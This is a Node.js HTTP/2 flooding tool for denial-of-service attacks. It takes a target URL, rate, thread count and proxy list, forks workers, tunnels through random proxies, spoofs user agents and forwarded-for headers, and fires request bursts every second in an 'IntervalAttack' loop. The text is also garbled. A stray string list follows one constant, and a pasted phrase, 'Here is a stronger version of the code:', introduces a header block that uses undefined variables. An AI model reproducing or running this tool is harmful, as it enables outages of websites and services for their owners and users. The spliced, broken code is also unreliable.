const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const { HeaderGenerator } = require('header-generator');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`<target> <time> <rate> <threads> <proxyfile>`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 let headerGenerator = new HeaderGenerator({
     browsers: [
         {name: "firefox", minVersion: 100, httpVersion: "2"},
     ],
     devices: [
         "desktop",
     ],
     operatingSystems: [
         "windows",
     ],
     locales: ["en-US", "en"]
 });

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 60000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
const sigalgs = 
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
		'ecdsa_secp256r1_sha256',
		'ecdsa_brainpoolP256r1tls13_sha256',
		'ecdsa_brainpoolP384r1tls13_sha384',
		'ecdsa_brainpoolP512r1tls13_sha512',
		'ecdsa_sha1',
		'ed25519',
		'ed448',
		'rsa_pkcs1_sha1',
		'rsa_pkcs1_sha256',
		'rsa_pkcs1_sha384',
		'rsa_pss_pss_sha256',
		'rsa_pss_pss_sha384',
		'rsa_pss_pss_sha512',
		'sm2sig_sm3',           
		'ecdsa_secp384r1_sha384',
		'ecdsa_secp521r1_sha512',
		'rsa_pss_rsae_sha256',
		'rsa_pss_rsae_sha384',
		'rsa_pss_rsae_sha512',
		'rsa_pkcs1_sha512';

 const Header = new NetSocket();
 Here is a stronger version of the code:

const header = new NetSocket();
header[":method"] = "GET";
header[":scheme"] = "https";
header[":path"] = parsedTarget.path;
header["accept"] = randomHeaders["accept"];
header["accept-encoding"] = randomHeaders["accept-encoding"];
header["accept-language"] = randomHeaders["accept-language"];
header["access-control-allow-origin"] = "*";
header["age"] = randomHeaders["age"];
header["alt-svc"] = randomHeaders["alt-svc"];
header["cache-control"] = randomHeaders["cache-control"];
header["client-ip"] = parsedProxy[0];
header["connection"] = "keep-alive";
header["content-encoding"] = randomHeaders["content-encoding"];
header["content-length"] = randomHeaders["content-length"];
header["content-security-policy"] = randomHeaders["content-security-policy"];
header["content-type"] = randomHeaders["content-type"];
header["cross-origin-opener-policy"] = randomHeaders["cross-origin-opener-policy"];
header["date"] = randomHeaders["date"];
header["etag"] = randomHeaders["etag"];
header["keep-alive"] = "parameters";
header["last-modified"] = randomHeaders["last-modified"];
header["pragma"] = "no-cache";
header["referrer-policy"] = randomHeaders["referrer-policy"];
header["report-to"] = randomHeaders["report-to"];
header["sec-ch-ua"] = randomHeaders["sec-ch-ua"];
header["sec-ch-ua-platform"] = randomHeaders["sec-ch-ua-platform"];
header["sec-fetch-dest"] = randomHeaders["sec-fetch-dest"];
header["sec-fetch-mode"] = randomHeaders["sec-fetch-mode"];
header["sec-fetch-site"] = randomHeaders["sec-fetch-site"];
header["server"] = randomHeaders["server"];
header["strict-transport-security"] = randomHeaders["strict-transport-security"];
header["te"] = "trailers";
header["timing-allow-origin"] = "*";
header["upgrade-insecure-requests"] = randomHeaders["upgrade-insecure-requests"];
header["vary"] = randomHeaders["vary"];
header["via"] = randomHeaders["via"];
header["x-content-type-options"] = randomHeaders["x-content-type-options"];
header["x-frame-options"] = randomHeaders["x-frame-options"];
header["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var useragent = userAgentv2.toString();
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     headers["user-agent"] = useragent;
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 60000);

         const tlsOptions = {
            ALPNProtocols: ['h2', 'http1.1'],
            followAllRedirects: true,
            challengeToSolve: Infinity,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            echdCurve: "X25519:P-256:P-384",
            ciphers: tls.getCiphers().join(":") + "ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            sigalgs: sigalgs,
            requestCert: true,
            servername: url.hostname,
            secure: true,
            port: 443,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLS_method"],
            uri: parsedTarget.host,
            servername: parsedTarget.host,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
